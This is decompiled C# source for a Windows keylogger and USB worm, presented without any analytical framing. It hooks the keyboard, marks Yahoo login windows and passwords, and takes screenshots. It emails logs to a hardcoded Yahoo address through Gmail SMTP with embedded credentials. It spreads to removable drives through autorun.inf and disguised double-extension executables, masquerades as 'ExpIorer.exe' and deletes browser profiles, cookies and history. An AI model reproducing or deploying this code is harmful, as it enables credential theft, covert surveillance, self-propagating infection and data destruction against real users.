using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

namespace NEW;

internal static class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static List<string> li = new List<string>();

	private static string km = "";

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public static byte caps = 0;

	public static byte shift = 0;

	public static byte failed = 0;

	private static string mreg = Path.GetRandomFileName();

	private static string winm;

	private static string wink;

	[DllImport("user32.dll")]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(int hWnd, StringBuilder text, int count);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static void USBSpread(object sender, EventArgs e)
	{
		string sourceFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "Service.exe");
		int num = 0;
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo item in drives.Where((DriveInfo x) => x.IsReady && x.DriveType.ToString() == "Removable" && x.ToString() != "A:\\" && x.ToString() != "B:\\"))
		{
			if (File.Exists(item.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe"))
			{
				continue;
			}
			string[] directories = Directory.GetDirectories(item.Name);
			foreach (string text in directories)
			{
				num++;
				try
				{
					File.Copy(sourceFileName, text + ".scr", overwrite: true);
					if (File.Exists(text + ".scr"))
					{
						File.SetAttributes(text, File.GetAttributes(text) | FileAttributes.Hidden);
						break;
					}
				}
				catch
				{
					File.Copy(sourceFileName, string.Concat(item, "$Recycle.Bin.scr"), overwrite: true);
				}
			}
			if (num == 0)
			{
				File.Copy(sourceFileName, string.Concat(item, "$Recycle.Bin.scr"), overwrite: true);
			}
			try
			{
				string path = item.Name + "autorun.inf";
				StreamWriter streamWriter = new StreamWriter(path);
				streamWriter.WriteLine("[autorun]\\n");
				streamWriter.WriteLine("icon=angel.ico");
				streamWriter.WriteLine("open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				streamWriter.WriteLine("action=Run VMCLite");
				streamWriter.WriteLine("Shell\\Open=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				streamWriter.WriteLine("Shell\\Open\\Default=1");
				streamWriter.WriteLine("Shell\\Explore=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				streamWriter.WriteLine("Shell\\Explore\\Command=private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				streamWriter.WriteLine("[autorun]\n");
				streamWriter.Close();
				File.SetAttributes(item.Name + "autorun.inf", File.GetAttributes(item.Name + "autorun.inf") | FileAttributes.Hidden);
				item.VolumeLabel = "angel";
			}
			catch
			{
			}
			try
			{
				if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe")))
				{
					File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), item.Name + "private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe");
				}
				if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates).ToString(), "angel.ico")))
				{
					File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates).ToString(), "angel.ico"), item.Name + "angel.ico", overwrite: true);
					File.SetAttributes(item.Name + "angel.ico", File.GetAttributes(item.Name + "angel.ico") | FileAttributes.Hidden);
					File.SetAttributes(item.Name + "angel.ico", File.GetAttributes(item.Name + "angel.ico") | FileAttributes.System);
				}
				Directory.CreateDirectory(item.Name + "$Recycle.Bin");
				File.SetAttributes(item.Name + "$Recycle.Bin", File.GetAttributes(item.Name + "$Recycle.Bin") | FileAttributes.Hidden);
				if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe")))
				{
					File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), Path.Combine(item.Name + "$Recycle.Bin", "ExpIorer.exe"));
				}
				File.Copy(sourceFileName, Path.Combine(item.Name + "$Recycle.Bin", "service.exe"));
			}
			catch
			{
			}
		}
	}

	private static void email(object sender, EventArgs e)
	{
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Expected O, but got Unknown
		try
		{
			string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Yahoo!\\Messenger");
			foreach (string text in directories)
			{
				km = km + "<" + text.Substring(text.IndexOf("\\Yahoo!\\Messenger") + 18).Replace("005F", "") + ">";
				li.Add("<" + text.Substring(text.IndexOf("\\Yahoo!\\Messenger") + 18).Replace("005F", "") + ">");
			}
		}
		catch
		{
		}
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		try
		{
			val2.CopyFromScreen(0, 0, 0, 0, ((Image)val).get_Size());
		}
		finally
		{
			((IDisposable)val2)?.Dispose();
		}
		if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall")))
		{
			File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		}
		((Image)val).Save(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add("zibayekhofte_lover2006@yahoo.com");
		mailMessage.From = new MailAddress("XtahmineX@gmail.com", "XtahmineX", Encoding.UTF8);
		mailMessage.Subject = Environment.UserName + " key";
		mailMessage.SubjectEncoding = Encoding.UTF8;
		mailMessage.Body = km + li;
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.IsBodyHtml = false;
		mailMessage.Priority = MailPriority.High;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Credentials = new NetworkCredential("XtahmineX@gmail.com", "20morteza");
		smtpClient.Port = 587;
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.EnableSsl = true;
		Attachment item = new Attachment(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Wall"));
		mailMessage.Attachments.Add(item);
		ServicePointManager.ServerCertificateValidationCallback = (object s, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true;
		try
		{
			smtpClient.Send(mailMessage);
			km = "";
		}
		catch
		{
		}
	}

	private static void Main()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
		folderPath = Path.Combine(folderPath, "Service.exe");
		bool createdNew;
		Mutex mutex = new Mutex(initiallyOwned: true, Application.get_ProductName(), out createdNew);
		if (createdNew)
		{
			mutex.ReleaseMutex();
		}
		else
		{
			if (Application.get_StartupPath().Length < 10)
			{
				Process.Start("Explorer", Application.get_ExecutablePath().Substring(0, Application.get_ExecutablePath().Length - 4));
			}
			Process.GetCurrentProcess().Kill();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath().ToString(), folderPath, overwrite: true);
			File.Copy(Application.get_ExecutablePath().ToString(), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "Thumbs.db"), overwrite: true);
		}
		catch
		{
		}
		if (Application.get_StartupPath().Length < 10)
		{
			try
			{
				Process.Start("Explorer", Application.get_ExecutablePath().Substring(0, Application.get_ExecutablePath().Length - 4));
				if (File.Exists(Application.get_StartupPath() + "\\angel.ico"))
				{
					File.Copy(Application.get_StartupPath() + "\\angel.ico", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), "angel.ico"), overwrite: true);
				}
				if (File.Exists(Path.Combine(Application.get_StartupPath() + "\\$Recycle.Bin", "ExpIorer.exe")))
				{
					File.Copy(Path.Combine(Application.get_StartupPath() + "\\$Recycle.Bin", "ExpIorer.exe"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), overwrite: true);
					File.Copy(Path.Combine(Application.get_StartupPath() + "\\$Recycle.Bin", "ExpIorer.exe"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db"), overwrite: true);
				}
				else if (File.Exists(Application.get_StartupPath() + "\\private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe"))
				{
					File.Copy(Application.get_StartupPath() + "\\private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"), overwrite: true);
					File.Copy(Application.get_StartupPath() + "\\private(my film, my music,birthday,khososi,arooosi,my picture,exe file.dlll.jpeg.jpg.exe", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db"), overwrite: true);
				}
				Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
				Process.GetCurrentProcess().Kill();
			}
			catch
			{
			}
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data", recursive: true);
		}
		catch
		{
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Mozilla\\Firefox\\Profiles", recursive: true);
		}
		catch
		{
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Opera\\Opera", recursive: true);
		}
		catch
		{
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Cookies), recursive: true);
		}
		catch
		{
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache), recursive: true);
		}
		catch
		{
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Internet Explorer", recursive: true);
		}
		catch
		{
		}
		try
		{
			Directory.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Windows\\History", recursive: true);
		}
		catch
		{
		}
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += email;
		timer.AutoReset = true;
		timer.Interval = 600000.0;
		timer.Start();
		System.Timers.Timer timer2 = new System.Timers.Timer();
		timer2.Elapsed += USBSpread;
		timer2.AutoReset = true;
		timer2.Interval = 3000.0;
		timer2.Start();
		System.Timers.Timer timer3 = new System.Timers.Timer();
		timer3.Elapsed += proccess;
		timer3.AutoReset = true;
		timer3.Interval = 1000.0;
		timer3.Start();
		_hookID = SetHook(_proc);
		Application.Run();
		GC.KeepAlive(timer2);
		GC.KeepAlive(timer3);
		GC.KeepAlive(timer);
		UnhookWindowsHookEx(_hookID);
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static void GetActiveWindow(object sender, EventArgs e)
	{
		wink = "";
		int num = 0;
		StringBuilder stringBuilder = new StringBuilder(256);
		num = GetForegroundWindow();
		if (GetWindowText(num, stringBuilder, 256) > 0 && winm != stringBuilder.ToString())
		{
			if (stringBuilder.ToString().IndexOf("Yahoo! Messenger") > -1 || stringBuilder.ToString().IndexOf("Sign in to Yahoo!") > -1 || stringBuilder.ToString().IndexOf("Yahoo! Mail: The best web-based email!") > -1)
			{
				km = km + " (" + stringBuilder.ToString() + ")#---> USER IS:::";
				wink = stringBuilder.ToString();
			}
			else
			{
				km = km + " (" + stringBuilder.ToString() + ")";
			}
			winm = stringBuilder.ToString();
		}
	}

	private static void proccess(object sender, EventArgs e)
	{
		GetActiveWindow(null, null);
		int num = 0;
		Process[] processes = Process.GetProcesses();
		foreach (Process item in processes.Where((Process x) => x.ToString() == "System.Diagnostics.Process (ExpIorer)"))
		{
			_ = item;
			num = 1;
		}
		if (num != 0)
		{
			return;
		}
		try
		{
			if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe")) && File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db")))
			{
				try
				{
					File.Copy(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Thumbs.db"), Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
				}
				catch
				{
				}
			}
			try
			{
				Process.Start(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ExpIorer.exe"));
				Process.GetCurrentProcess().Kill();
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0030: Invalid comparison between I4 and Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Invalid comparison between Unknown and I4
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004a: Invalid comparison between Unknown and I4
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected I4, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Invalid comparison between Unknown and I4
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Invalid comparison between Unknown and I4
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0177: Expected I4, but got Unknown
		//IL_042e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0434: Invalid comparison between Unknown and I4
		//IL_0439: Unknown result type (might be due to invalid IL or missing references)
		//IL_043c: Unknown result type (might be due to invalid IL or missing references)
		//IL_047e: Expected I4, but got Unknown
		//IL_047e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0484: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ca: Expected I4, but got Unknown
		//IL_05e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0609: Expected I4, but got Unknown
		//IL_0609: Unknown result type (might be due to invalid IL or missing references)
		//IL_060f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0625: Expected I4, but got Unknown
		int num;
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			num = Marshal.ReadInt32(lParam);
			if (65536 == (int)Control.get_ModifierKeys())
			{
				shift = 1;
			}
			Keys val = (Keys)num;
			if ((int)val <= 57)
			{
				if ((int)val <= 13)
				{
					switch (val - 8)
					{
					case 0:
						goto IL_0082;
					case 1:
						goto IL_00b8;
					}
					if ((int)val != 13)
					{
						goto IL_0625;
					}
					km += "Return";
				}
				else if ((int)val != 20)
				{
					switch (val - 32)
					{
					case 0:
						km += " ";
						goto IL_0987;
					case 16:
						break;
					case 17:
						goto IL_01d4;
					case 18:
						goto IL_0213;
					case 19:
						goto IL_0252;
					case 20:
						goto IL_0291;
					case 21:
						goto IL_02d0;
					case 22:
						goto IL_030f;
					case 23:
						goto IL_034e;
					case 24:
						goto IL_038d;
					case 25:
						goto IL_03cc;
					default:
						goto IL_0625;
					case 1:
					case 2:
					case 5:
					case 6:
					case 7:
					case 8:
						goto IL_0987;
					}
					if (shift == 0)
					{
						km += "0";
					}
					else
					{
						km += ")";
					}
				}
				else if (caps == 0)
				{
					caps = 1;
				}
				else
				{
					caps = 0;
				}
				goto IL_0987;
			}
			if ((int)val <= 175)
			{
				switch (val - 91)
				{
				default:
					switch (val - 160)
					{
					case 0:
					case 1:
					case 2:
					case 3:
					case 4:
					case 5:
						break;
					default:
						goto end_IL_043d;
					case 13:
					case 14:
					case 15:
						goto IL_0987;
					}
					goto case 0;
				case 0:
				case 1:
				case 2:
					km = km ?? "";
					goto IL_0987;
				case 5:
					km += "0";
					goto IL_0987;
				case 6:
					km += "1";
					goto IL_0987;
				case 7:
					km += "2";
					goto IL_0987;
				case 8:
					km += "3";
					goto IL_0987;
				case 9:
					km += "4";
					goto IL_0987;
				case 10:
					km += "5";
					goto IL_0987;
				case 11:
					km += "6";
					goto IL_0987;
				case 12:
					km += "7";
					goto IL_0987;
				case 13:
					km += "8";
					goto IL_0987;
				case 14:
					km += "9";
					goto IL_0987;
				case 3:
				case 4:
					break;
					end_IL_043d:
					break;
				}
			}
			else
			{
				switch (val - 186)
				{
				case 0:
					goto IL_07df;
				case 1:
					goto IL_081e;
				case 2:
					goto IL_085d;
				case 3:
					goto IL_089c;
				case 4:
					goto IL_08db;
				case 5:
					goto IL_0917;
				case 6:
					goto IL_0950;
				}
				switch (val - 219)
				{
				case 0:
					goto IL_0707;
				case 1:
					goto IL_0746;
				case 2:
					goto IL_075f;
				case 3:
					goto IL_079e;
				}
			}
			goto IL_0625;
		}
		goto IL_098d;
		IL_0291:
		if (shift == 0)
		{
			km += "4";
		}
		else
		{
			km += "$";
		}
		goto IL_0987;
		IL_0625:
		if (shift == 0 && caps == 0)
		{
			km += ((object)(Keys)num).ToString()!.ToLower();
		}
		if (shift == 1 && caps == 0)
		{
			km += ((object)(Keys)num).ToString()!.ToUpper();
		}
		if (shift == 0 && caps == 1)
		{
			km += ((object)(Keys)num).ToString()!.ToUpper();
		}
		if (shift == 1 && caps == 1)
		{
			km += ((object)(Keys)num).ToString()!.ToLower();
		}
		goto IL_0987;
		IL_098d:
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
		IL_02d0:
		if (shift == 0)
		{
			km += "5";
		}
		else
		{
			km += "%";
		}
		goto IL_0987;
		IL_0987:
		shift = 0;
		goto IL_098d;
		IL_081e:
		if (shift == 0)
		{
			km += "=";
		}
		else
		{
			km += "+";
		}
		goto IL_0987;
		IL_00b8:
		if (wink == winm)
		{
			km += "-->PASSWORD IS:::";
		}
		else
		{
			km += "TAB";
		}
		goto IL_0987;
		IL_0746:
		km += "|";
		goto IL_0987;
		IL_0213:
		if (shift == 0)
		{
			km += "2";
		}
		else
		{
			km += "@";
		}
		goto IL_0987;
		IL_0082:
		if (km.Length > 1)
		{
			km = km.Substring(0, km.Length - 1);
		}
		goto IL_0987;
		IL_0917:
		if (shift == 0)
		{
			km += "/";
		}
		else
		{
			km += "?";
		}
		goto IL_0987;
		IL_0252:
		if (shift == 0)
		{
			km += "3";
		}
		else
		{
			km += "#";
		}
		goto IL_0987;
		IL_085d:
		if (shift == 0)
		{
			km += ",";
		}
		else
		{
			km += "<";
		}
		goto IL_0987;
		IL_0707:
		if (shift == 0)
		{
			km += "[";
		}
		else
		{
			km += "{";
		}
		goto IL_0987;
		IL_0950:
		if (shift == 0)
		{
			km += "`";
		}
		else
		{
			km += "~";
		}
		goto IL_0987;
		IL_03cc:
		if (shift == 0)
		{
			km += "9";
		}
		else
		{
			km += "(";
		}
		goto IL_0987;
		IL_08db:
		if (shift == 0)
		{
			km += ".";
		}
		else
		{
			km += ">";
		}
		goto IL_0987;
		IL_075f:
		if (shift == 0)
		{
			km += "]";
		}
		else
		{
			km += "}";
		}
		goto IL_0987;
		IL_038d:
		if (shift == 0)
		{
			km += "8";
		}
		else
		{
			km += "*";
		}
		goto IL_0987;
		IL_089c:
		if (shift == 0)
		{
			km += "-";
		}
		else
		{
			km += "_";
		}
		goto IL_0987;
		IL_01d4:
		if (shift == 0)
		{
			km += "1";
		}
		else
		{
			km += "!";
		}
		goto IL_0987;
		IL_034e:
		if (shift == 0)
		{
			km += "7";
		}
		else
		{
			km += "&";
		}
		goto IL_0987;
		IL_07df:
		if (shift == 0)
		{
			km += ";";
		}
		else
		{
			km += ":";
		}
		goto IL_0987;
		IL_079e:
		if (shift == 0)
		{
			km += "'";
		}
		else
		{
			km += '"';
		}
		goto IL_0987;
		IL_030f:
		if (shift == 0)
		{
			km += "6";
		}
		else
		{
			km += "^";
		}
		goto IL_0987;
	}
}
